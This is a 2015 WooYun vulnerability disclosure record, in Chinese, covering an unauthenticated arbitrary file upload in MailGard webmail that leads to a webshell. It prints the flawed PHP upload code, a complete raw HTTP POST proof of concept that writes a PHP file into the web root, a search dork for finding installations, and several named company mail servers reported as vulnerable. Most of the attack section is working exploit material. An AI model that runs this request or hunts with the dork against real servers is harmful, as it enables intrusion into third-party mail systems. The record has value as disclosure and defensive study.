{"id": 34870, "wybug_id": "wooyun-2015-098084", "wybug_title": "佑友mailgard webmail任意文件上传导致getshell（无需登录）", "wybug_corp": "深圳市河辰通讯技术有限公司", "wybug_author": "f4ckbaidu", "wybug_date": "2015-02-24 12:28", "wybug_open_date": "2015-05-31 15:40", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "越权访问"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向公众公开  简要描述： 与WooYun-2015-97939和WooYun-2015-97649不同，来一发不需要登录的 详细说明：  一、某些文件存在越权访问（无需登录即可访问）经过WooYun-2015-97939和WooYun-2015-97649的审计得到以下结论：没有包含根目录下global.php的文件，都可以直接访问不会跳转到登陆界面于是查找可能存在越权访问的文件：\n$ find -name \"*.php\" | xargs grep -L -E \"^require_once.+(\\.\\.\\/global|[^/]global)\\.php.+;$\"\n剔除掉无用的文件，留下几个有意思的php文件：\n./overflow_alarm.php./sms_send.php./src/old.rule.php./src/public_folders_upload.php./src/big_attach.php./src/big_att_upload.php./src/read_data.php./src/upload.php./sync/linkman.php\n二、代码问题导致任意文件上传瞅瞅/src/big_att_upload.php的代码，为了保护程序猿，咱打上马赛克哈\n<?php/* +-----------------------------------------------------------------------+ | Author: 马赛克                      | +-----------------------------------------------------------------------+*/require_once('../config/config.php');require_once('../functions/global.php');if (isset($_POST[\"PHPSESSID\"])) {\tsession_id($_POST[\"PHPSESSID\"]);}$realDir = realPath($_POST['dir']).'/';$goexpr = true;if (isset($_FILES[\"Filedata\"]) || is_uploaded_file($_FILES[\"Filedata\"][\"tmp_name\"]) || $_FILES[\"Filedata\"][\"error\"] == 0) {\t$fStr = $_FILES[\"Filedata\"][\"name\"];\t$fSize = getUnitSpace($_FILES[\"Filedata\"][\"size\"]);\t$fArr = explode('.', $fStr);\t$fSuffix = end($fArr);\t$fPrefix = substr($fStr, 0, -(strlen($fSuffix)+1));\t$movefile = $realDir.$fStr;\t$auton = 0;\twhile($goexpr){\t\tif(is_file($movefile) && $_POST['attachType'] == 'big_att'){\t\t\t$movefile = $realDir.$fPrefix.'('.$auton.').'.$fSuffix;\t\t\t$fStr = $fPrefix.'('.$auton.').'.$fSuffix;\t\t\t$auton++;\t\t}else{\t\t\t$goexpr = false;\t\t}\t}\t\tif(move_uploaded_file($_FILES[\"Filedata\"][\"tmp_name\"], $movefile)){\t\tif($_POST['attachType'] == 'big_att'){\t\t\techo 'big_att:'.$fStr.':'.$fSize;exit;\t\t}else{\t\t\techo '1';exit;\t\t}\t}}?>\n这也是醉了，不仅有越权访问，而且上传还木有任何后缀限制直接上传把filename对应文件放到realPath($_POST['dir']).'/'下POC：\nPOST http://mail.domain.com:889/src/big_att_upload.php HTTP/1.1Host: mail.domain.com:889Connection: keep-aliveContent-Length: 658Origin: http://mail.domain.com:889X-Requested-With: ShockwaveFlash/16.0.0.305User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36Content-Type: multipart/form-data; boundary=----------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5Accept: */*Referer: http://mail.domain.com:889/src/write_mail.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4Cookie: PHPSESSID=outb98m2mckt5a03pejd1aqra0; _HICOM[LANGUAGE]=zh-cn------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5Content-Disposition: form-data; name=\"Filename\"vultest.php------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5Content-Disposition: form-data; name=\"PHPSESSID\"outb98m2mckt5a03pejd1aqra0------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5Content-Disposition: form-data; name=\"dir\"/var/www/newmail/------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5Content-Disposition: form-data; name=\"Filedata\"; filename=\"vultest.php\"Content-Type: application/octet-stream12345------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5Content-Disposition: form-data; name=\"Upload\"Submit Query------------ei4gL6ae0Ef1GI3ei4KM7ei4Ef1Ij5--\n访问http://mail.domain.com:889/vultest.php即可还有2个上传点也是一样的问题，realpath支持../，你懂的，我就不发POC了/var/www/newmail/src/upload.php：\n<?php/* +-----------------------------------------------------------------------+ | Author: 马赛克                | +-----------------------------------------------------------------------+*/require_once('../config/config.php');// 网络硬盘// Work-around for setting up a session because Flash Player doesn't send the cookiesif (isset($_POST[\"PHPSESSID\"])) {\tsession_id($_POST[\"PHPSESSID\"]);}$netDiskDir = HM_BOXS.$_POST['netDiskDir'];$realDir = realPath($netDiskDir.'/'.$_POST['curDir']).'/';if (!isset($_FILES[\"Filedata\"]) || !is_uploaded_file($_FILES[\"Filedata\"][\"tmp_name\"]) || $_FILES[\"Filedata\"][\"error\"] != 0) {\t$_FILES[\"Filedata\"] = $_FILES[\"Filedata2\"];}$goexpr = true;if (isset($_FILES[\"Filedata\"]) || is_uploaded_file($_FILES[\"Filedata\"][\"tmp_name\"]) || $_FILES[\"Filedata\"][\"error\"] == 0) {\t$fStr = $_FILES[\"Filedata\"][\"name\"];\t$fArr = explode('.', $fStr);\t$fSuffix = end($fArr);\t$fPrefix = substr($fStr, 0, -(strlen($fSuffix)+1));\t$movefile = $realDir.$fStr;\t$auton = 0;\twhile($goexpr){\t\tif(is_file($movefile)){\t\t\t$movefile = $realDir.$fPrefix.'('.$auton.').'.$fSuffix;\t\t\t$auton++;\t\t}else{\t\t\t$goexpr = false;\t\t}\t}\t\tmove_uploaded_file($_FILES[\"Filedata\"][\"tmp_name\"], $movefile);}if (isset($_FILES[\"Filedata2\"]) || is_uploaded_file($_FILES[\"Filedata2\"][\"tmp_name\"]) || $_FILES[\"Filedata2\"][\"error\"] == 0) {\techo 'document.getElementById(\"show_Filedata2\").innerHTML = \\'<input type=\"file\" id=\"Filedata2\" name=\"Filedata2\">\\';document.getElementById(\"PHPUploadProgress\").style.display = \"none\";document.getElementById(\"PHPUploadCompose\").style.display = \"\";';}echo '';exit;?>\n/var/www/newmail/src/public_folders_upload.php：（realpath支持../，你懂的，我就不发POC了）\n<?php/* +-----------------------------------------------------------------------+ | Author: 马赛克                    | +-----------------------------------------------------------------------+*/require_once('../config/config.php');// 公共文件夹// Work-around for setting up a session because Flash Player doesn't send the cookiesif (isset($_POST[\"PHPSESSID\"])) {\tsession_id($_POST[\"PHPSESSID\"]);}$pubDir = HM_BOXS.$_POST['pubDir'];$realDir = realPath($pubDir.'/'.$_POST['curDir']).'/';if (!isset($_FILES[\"Filedata\"]) || !is_uploaded_file($_FILES[\"Filedata\"][\"tmp_name\"]) || $_FILES[\"Filedata\"][\"error\"] != 0) {\t$_FILES[\"Filedata\"] = $_FILES[\"Filedata2\"];}$goexpr = true;if (isset($_FILES[\"Filedata\"]) || is_uploaded_file($_FILES[\"Filedata\"][\"tmp_name\"]) || $_FILES[\"Filedata\"][\"error\"] == 0) {\t$fStr = $_FILES[\"Filedata\"][\"name\"];\t$fArr = explode('.', $fStr);\t$fSuffix = end($fArr);\t$fPrefix = substr($fStr, 0, -(strlen($fSuffix)+1));\t$movefile = $realDir.$fStr;\t$auton = 0;\twhile($goexpr){\t\tif(is_file($movefile)){\t\t\t$movefile = $realDir.$fPrefix.'('.$auton.').'.$fSuffix;\t\t\t$auton++;\t\t}else{\t\t\t$goexpr = false;\t\t}\t}\tmove_uploaded_file($_FILES[\"Filedata\"][\"tmp_name\"], $movefile);\texit;}if (isset($_FILES[\"Filedata2\"]) || is_uploaded_file($_FILES[\"Filedata2\"][\"tmp_name\"]) || $_FILES[\"Filedata2\"][\"error\"] == 0) {\techo '<script type=\"text/javascript\">parent.document.getElementById(\"show_Filedata2\").innerHTML = \\'<input type=\"file\" id=\"Filedata2\" name=\"Filedata2\">\\';parent.document.getElementById(\"PHPUploadProgress\").style.display = \"none\";parent.document.getElementById(\"PHPUploadCompose\").style.display = \"\";</script>';}echo '';exit;?>\n   漏洞证明：  百度搜索intitle:\"mailgard webmail\"，测试了一下基本上都中招http://www.gtc.com.cn:889/vultest.php\n\nhttp://mail.deluxworld.com:889/vultest.php\n\nhttp://mail.refond.com:889/vultest.php\n\nhttp://mail.boway.com:889/vultest.php\n\nhttp://mail.szzt.com.cn:889/vultest.php\n\nhttp://mail.szcwh.com:889/vultest.php\n\n   修复方案：     版权声明：转载请注明来源 f4ckbaidu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-02 15:38 厂商回复： CNVD确认所述漏洞情况，暂未建立与软件生产厂商（或网站管理单位）的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-24 22:59 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  webmail，这么叼！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}